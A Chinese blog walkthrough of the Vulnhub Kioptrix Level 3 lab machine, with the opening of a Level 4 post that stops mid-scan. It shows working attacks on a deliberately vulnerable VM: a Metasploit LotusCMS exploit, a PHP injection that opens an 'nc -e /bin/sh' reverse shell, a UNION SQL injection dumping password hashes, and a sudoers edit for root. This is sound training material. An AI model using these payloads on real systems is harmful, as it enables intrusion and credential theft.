    <content><![CDATA[<h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>同样需要更改虚拟机文件<code>KioptrixVM3.vmx</code>，把<code>ethernet0.connectionType = &quot;bridged&quot;</code>改为<code>ethernet0.connectionType = &quot;nat&quot;</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8jk1lvhxj313d0llwft.jpg" alt="image.png"><br>使用<code>sudo arp-scan -l</code>扫描内网，发现靶机IP是192.168.80.18。</p>
<p><escape> <span id="more"></span></escape></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b2:07:af, IPv4: 192.168.80.14</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.80.2    00:50:56:fc:96:a7       VMware, Inc.</span><br><span class="line">192.168.80.18   00:0c:29:ec:76:c0       VMware, Inc.</span><br><span class="line">192.168.80.17   00:0c:29:fe:3a:82       VMware, Inc.</span><br><span class="line">192.168.80.254  00:50:56:f8:e1:4e       VMware, Inc.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.077 seconds (123.25 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>
<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>输入命令<code>sudo nmap -A -T5 -sS 192.168.80.18</code>，扫描结果如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -A -T5 -sS 192.168.80.18</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 23:44 EST</span><br><span class="line">Nmap scan report for 192.168.80.18</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)</span><br><span class="line">|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Ligoat Security - Got Goat? Security ...</span><br><span class="line">MAC Address: 00:0C:29:EC:76:C0 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.12 ms 192.168.80.18</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.51 seconds</span><br></pre></td></tr></table></figure>
<p>我们扫描发现靶机开放了22端口（SSH服务）和80端口（http服务）。</p>
<h2 id="继续扫描漏洞"><a href="#继续扫描漏洞" class="headerlink" title="继续扫描漏洞"></a>继续扫描漏洞</h2><p>输入<code>nikto -h 192.168.80.18</code>，扫描结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nikto -h 192.168.80.18</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.80.18</span><br><span class="line">+ Target Hostname:    192.168.80.18</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-02-24 23:51:52 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">+ Cookie PHPSESSID created without the httponly flag</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)</span><br><span class="line">+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ OSVDB-3268: /icons/: Directory indexing found.</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ /phpmyadmin/: phpMyAdmin directory found</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ 7914 requests: 0 error(s) and 19 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-02-24 23:52:27 (GMT-5) (35 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
<h2 id="设置域名解析"><a href="#设置域名解析" class="headerlink" title="设置域名解析"></a>设置域名解析</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8kbub7hgj31f60u076p.jpg" alt="image.png"></p>
<h2 id="searchsploit查找网站框架漏洞"><a href="#searchsploit查找网站框架漏洞" class="headerlink" title="searchsploit查找网站框架漏洞"></a>searchsploit查找网站框架漏洞</h2><p>访问网站的登录页面，看到提示信息：此网站基于LotusCMS框架。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8kgxga76j30w70lo3zz.jpg" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ searchsploit LotusCMS</span><br><span class="line">----------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                   |  Path</span><br><span class="line">                                                                 | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------------- ----------------------------------------</span><br><span class="line">LotusCMS 3.0 - &#x27;eval()&#x27; Remote Command Execution (Metasploit)    | exploits/php/remote/18565.rb</span><br><span class="line">LotusCMS 3.0.3 - Multiple Vulnerabilities                        | exploits/php/webapps/16982.txt</span><br><span class="line">----------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
<p><a href="https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec">漏洞相关介绍资料</a></p>
<h3 id="metasploit漏洞利用过程"><a href="#metasploit漏洞利用过程" class="headerlink" title="metasploit漏洞利用过程"></a>metasploit漏洞利用过程</h3><p>反弹shell方法一（msfconsole）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; use exploit/multi/http/lcms_php_exec</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/lcms_php_exec):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS   192.168.80.18    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    80               yes       The target port (TCP)</span><br><span class="line">   SSL      false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /lcms/           yes       URI</span><br><span class="line">   VHOST                     no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.80.14    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic LotusCMS 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt;  set URI / </span><br><span class="line">URI =&gt; /</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt;  set RHOST kioptrix3.com</span><br><span class="line">RHOST =&gt; kioptrix3.com</span><br><span class="line">msf5 exploit(multi/http/lcms_php_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.14:4444 </span><br><span class="line">[*] Using found page param: /index.php?page=index</span><br><span class="line">[*] Sending exploit ...</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.80.18</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.80.14:4444 -&gt; 192.168.80.18:33134) at 2020-02-25 08:35:44 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4855 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
<p>反弹shell方法二（使用php注入）：</p>
<ol>
<li>攻击机监听5555端口：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nc -lnvp 5555</span><br><span class="line">listening on [any] 5555 ...</span><br></pre></td></tr></table></figure></li>
<li>浏览器中输入payload：<br><a href="https://blog.csdn.net/zuiaituantuan/article/details/5882566">php的system函数是干嘛的？</a><br><a href="http://kioptrix3.com/index.php?page=index&#39;);${system">http://kioptrix3.com/index.php?page=index&#39;);${system</a>(‘nc -e /bin/sh 192.168.80.14 5555’)};#<br>注意：这里的192.168.80.14是攻击机的IP。关键是对page这个参数进行命令注入，反弹shell至攻击机。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9076ff9lj31a50iwag0.jpg" alt="image.png"><br>进入这个shell中查找关键信息，发现这个gconfig.php文件，看看内容是什么：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">head -<span class="number">20</span> gconfig.php <span class="comment">#前20行数据，因为直接cat查看，一屏看不完</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        error_reporting(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                A sample Gallarific configuration file. You should edit</span></span><br><span class="line"><span class="comment">                the installer details below and save this file as gconfig.php</span></span><br><span class="line"><span class="comment">                Do not modify anything else if you don&#x27;t know what it is.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Installer Details -----------------------------------------------</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Enter the full HTTP path to your Gallarific folder below,</span></span><br><span class="line">        <span class="comment">// such as http://www.yoursite.com/gallery</span></span><br><span class="line">        <span class="comment">// Do NOT include a trailing forward slash</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&quot;gallarific_path&quot;</span>] = <span class="string">&quot;http://kioptrix3.com/gallery&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&quot;gallarific_mysql_server&quot;</span>] = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&quot;gallarific_mysql_database&quot;</span>] = <span class="string">&quot;gallery&quot;</span>;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&quot;gallarific_mysql_username&quot;</span>] = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&quot;gallarific_mysql_password&quot;</span>] = <span class="string">&quot;fuckeyou&quot;</span>;</span><br></pre></td></tr></table></figure>
在这个配置文件里，我们发现了重要信息，mysql数据库的root账号密码：<code>root/fuckeyou</code>。<br>于是我们在shell中进入mysql数据库，查询到用户名dreg和loneferret，并获取到密码的md5密文。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 70</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema | </span><br><span class="line">| gallery            | </span><br><span class="line">| mysql              | </span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use gallery</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+----------------------+</span><br><span class="line">| Tables_in_gallery    |</span><br><span class="line">+----------------------+</span><br><span class="line">| dev_accounts         | </span><br><span class="line">| gallarific_comments  | </span><br><span class="line">| gallarific_galleries | </span><br><span class="line">| gallarific_photos    | </span><br><span class="line">| gallarific_settings  | </span><br><span class="line">| gallarific_stats     | </span><br><span class="line">| gallarific_users     | </span><br><span class="line">+----------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from dev_accounts;</span><br><span class="line">+----+------------+----------------------------------+</span><br><span class="line">| id | username   | password                         |</span><br><span class="line">+----+------------+----------------------------------+</span><br><span class="line">|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | </span><br><span class="line">|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | </span><br><span class="line">+----+------------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h2 id="发现存在sql注入的url"><a href="#发现存在sql注入的url" class="headerlink" title="发现存在sql注入的url"></a>发现存在sql注入的url</h2>【now】——【Ligoat Press Room】<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8qnl3n60j30zv0nlq4v.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8qp7aa24j30zq0mhqdh.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8qqhm573j30zs0niai5.jpg" alt="image.png"><br>输入<code>&#39;</code>（url：<a href="http://kioptrix3.com/gallery/gallery.php?id=%27）">http://kioptrix3.com/gallery/gallery.php?id=%27）</a> 判断是否存在注入点：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8qsmwdjlj30zm0mgjss.jpg" alt="image.png"><h3 id="sql注入的过程"><a href="#sql注入的过程" class="headerlink" title="sql注入的过程"></a>sql注入的过程</h3></li>
<li>查出一共有多少列<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=1">http://kioptrix3.com/gallery/gallery.php?id=1</a> order by 1– (No Error)<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=1">http://kioptrix3.com/gallery/gallery.php?id=1</a> order by 2– (No Error)<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=1">http://kioptrix3.com/gallery/gallery.php?id=1</a> order by 3– (No Error)<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=1">http://kioptrix3.com/gallery/gallery.php?id=1</a> order by 4– (No Error)<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=1">http://kioptrix3.com/gallery/gallery.php?id=1</a> order by 5– (No Error)<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=1">http://kioptrix3.com/gallery/gallery.php?id=1</a> order by 6– (No Error)<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=1">http://kioptrix3.com/gallery/gallery.php?id=1</a> order by 7– (Error – Unknown Column)<br>根据查询结果，可判断出一共有6列。</li>
<li>找到可查询的列<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20all%20select%201,2,3,4,5,6--">http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20all%20select%201,2,3,4,5,6--</a><br> <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8r2j7o7oj30zo0n90x5.jpg" alt="image.png"><br>根据查询结果，发现可以查询第二列和第三列的数据。</li>
<li>获取数据库版本<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20all%20select%201,@@version,database(),4,5,6--">http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20all%20select%201,@@version,database(),4,5,6--</a><br> <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8r5jiwhkj30zn0nj0xa.jpg" alt="image.png"><br>数据库版本是<code>5.0.51a-3ubuntu5.4</code>。</li>
<li>查询所有的数据库<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,2,group_concat(table_name),4,5,6%20from%20information_schema.tables%20where%20table_schema=database()--">http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,2,group_concat(table_name),4,5,6%20from%20information_schema.tables%20where%20table_schema=database()--</a><br> <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8w0jtf53j30zq0ndq7b.jpg" alt="image.png"><br>数据库包括：dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos,gallarific_settings,gallarific_stats,gallarific_users</li>
<li>查询数据库dev_accounts的内容<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,group_concat(column_name),3,4,5,6%20FROM%20information_schema.columns%20WHERE%20table_name=CHAR(100,%20101,%20118,%2095,%2097,%2099,%2099,%20111,%20117,%20110,%20116,%20115)--">http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,group_concat(column_name),3,4,5,6%20FROM%20information_schema.columns%20WHERE%20table_name=CHAR(100,%20101,%20118,%2095,%2097,%2099,%2099,%20111,%20117,%20110,%20116,%20115)--</a><br>这里我们在<a href="http://www.unit-conversion.info/texttools/ascii/">网上</a>把table_name=dev_accounts转化为ASCII的表示形式：table_name=char(100, 101, 118, 95, 97, 99, 99, 111, 117, 110, 116, 115)<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8w3vt54yj31f60u043o.jpg" alt="image.png"></li>
<li>查询用户名和密码<br> <a href="http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,group_concat(username,0x3a,password),3,4,5,6%20FROM%20dev_accounts--">http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,group_concat(username,0x3a,password),3,4,5,6%20FROM%20dev_accounts--</a><br> <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc8w7e1yuxj30zq0ng0x9.jpg" alt="image.png"><br>注意，要把<code>:</code>转化为ASCII值<code>0x3a</code>。<br>现在我们获取到了两个用户的用户名和密码：<br>dreg:0d3eccfb887aabd50f243b3f155c0f85<br>loneferret:5badcaf789d3d1d09794d8f021f40f0e<br>观察可知，这个密码是md5密文，到<a href="https://www.cmd5.com/">网上</a>解密可得到密码的明文。<br>最终获取到，用户名密码是：<br>dreg:Mast3r<br>loneferret:starwars</li>
<li>使用ssh登录用户loneferret<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh loneferret@192.168.80.18</span><br><span class="line">loneferret@192.168.80.18&#x27;s password: </span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">Last login: Tue Feb 25 10:45:22 2020 from localhost</span><br></pre></td></tr></table></figure>
编辑/etc/sudoers：在/usr/local/bin/ht后面加上<code>, /bin/sh</code>。（备注：按Fn+F6进入编辑状态，按ALt+F保存，按Ctrl+Z退出编辑。）<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">oneferret@Kioptrix3:~$ export TERM=xterm #进入编辑之前，必须要加这个环境变量</span><br><span class="line">loneferret@Kioptrix3:~$ sudo ht /etc/sudoers</span><br></pre></td></tr></table></figure>
使用<code>sudo /bin/sh</code>进入root权限。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo /bin/sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
找到flag页面：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">Congrats.txt  ht-2.0.18</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls -la</span></span><br><span class="line">total 52</span><br><span class="line">drwx------  5 root root  4096 2011-04-17 08:59 .</span><br><span class="line">drwxr-xr-x 21 root root  4096 2011-04-11 16:54 ..</span><br><span class="line">-rw-------  1 root root     9 2011-04-18 11:49 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  2227 2007-10-20 07:51 .bashrc</span><br><span class="line">-rw-r--r--  1 root root  1327 2011-04-16 08:13 Congrats.txt</span><br><span class="line">drwxr-xr-x 12 root root 12288 2011-04-16 07:26 ht-2.0.18</span><br><span class="line">-rw-------  1 root root   963 2011-04-12 19:33 .mysql_history</span><br><span class="line">-rw-------  1 root root   228 2011-04-18 11:09 .nano_history</span><br><span class="line">-rw-r--r--  1 root root   141 2007-10-20 07:51 .profile</span><br><span class="line">drwx------  2 root root  4096 2011-04-13 10:06 .ssh</span><br><span class="line">drwxr-xr-x  3 root root  4096 2011-04-15 23:30 .subversion</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat Congrats.txt</span></span><br><span class="line">Good for you for getting here.</span><br><span class="line">Regardless of the matter (staying within the spirit of the game of course)</span><br><span class="line">you got here, congratulations are in order. Wasn&#x27;t that bad now was it.</span><br><span class="line"></span><br><span class="line">Went in a different direction with this VM. Exploit based challenges are</span><br><span class="line">nice. Helps workout that information gathering part, but sometimes we</span><br><span class="line">need to get our hands dirty in other things as well.</span><br><span class="line">Again, these VMs are beginner and not intented for everyone. </span><br><span class="line">Difficulty is relative, keep that in mind.</span><br><span class="line"></span><br><span class="line">The object is to learn, do some research and have a little (legal)</span><br><span class="line">fun in the process.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">I hope you enjoyed this third challenge.</span><br><span class="line"></span><br><span class="line">Steven McElrea</span><br><span class="line">aka loneferret</span><br><span class="line">http://www.kioptrix.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Credit needs to be given to the creators of the gallery webapp and CMS used</span><br><span class="line">for the building of the Kioptrix VM3 site.</span><br><span class="line"></span><br><span class="line">Main page CMS: </span><br><span class="line">http://www.lotuscms.org</span><br><span class="line"></span><br><span class="line">Gallery application: </span><br><span class="line">Gallarific 2.1 - Free Version released October 10, 2009</span><br><span class="line">http://www.gallarific.com</span><br><span class="line">Vulnerable version of this application can be downloaded</span><br><span class="line">from the Exploit-DB website:</span><br><span class="line">http://www.exploit-db.com/exploits/15891/</span><br><span class="line"></span><br><span class="line">The HT Editor can be found here:</span><br><span class="line">http://hte.sourceforge.net/downloads.html</span><br><span class="line">And the vulnerable version on Exploit-DB here:</span><br><span class="line">http://www.exploit-db.com/exploits/17083/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Also, all pictures were taken from Google Images, so being part of the</span><br><span class="line">public domain I used them.</span><br></pre></td></tr></table></figure>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><a href="https://www.abatchy.com/2016/12/kioptrix-3-walkthrough-vulnhub">https://www.abatchy.com/2016/12/kioptrix-3-walkthrough-vulnhub</a><br><a href="https://rastating.github.io/kioptrix-level-3-ctf-walkthrough/">https://rastating.github.io/kioptrix-level-3-ctf-walkthrough/</a><br><a href="https://www.yeahhub.com/ctf-kioptrix-level-3-walkthrough/">https://www.yeahhub.com/ctf-kioptrix-level-3-walkthrough/</a><h2 id="拓展知识-sql注入讲解"><a href="#拓展知识-sql注入讲解" class="headerlink" title="拓展知识-sql注入讲解"></a>拓展知识-sql注入讲解</h2><a href="https://www.yeahhub.com/advanced-error-based-sql-injection-exploitation-manually/">https://www.yeahhub.com/advanced-error-based-sql-injection-exploitation-manually/</a></li>
</ol>
]]></content>
      <categories>
        <category>vulnhub靶机练习</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
        <tag>Kioptix Level 3</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机练习之Kioptrix level 4</title>
    <url>//posts/ZH-CN/Vulnhub_Kioptrix_Four.html</url>
    <content><![CDATA[<h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>使用<code>sudo arp-scan -l</code>扫描，发现靶机IP是192.168.80.19。</p>
<p><escape> <span id="more"></span></escape></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b2:07:af, IPv4: 192.168.80.14</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.80.2    00:50:56:fc:96:a7       VMware, Inc.</span><br><span class="line">192.168.80.19   00:0c:29:c9:6f:5d       VMware, Inc.</span><br><span class="line">192.168.80.254  00:50:56:f8:e1:4e       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.308 seconds (110.92 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
<h2 id="使用nmap扫描"><a href="#使用nmap扫描" class="headerlink" title="使用nmap扫描"></a>使用nmap扫描</h2><p>nmap扫描，发现靶机开启了这些端口服务：22（ssh服务）、80（http服务）、139（smb服务）、445（smb服务）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -A -T5 -sS 192.168.80.19</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-26 08:16 EST</span><br><span class="line">Nmap scan report for 192.168.80.19</span><br><span class="line">Host is up (0.00091s latency).</span><br><span class="line">Not shown: 566 closed ports, 430 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)</span><br><span class="line">|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with 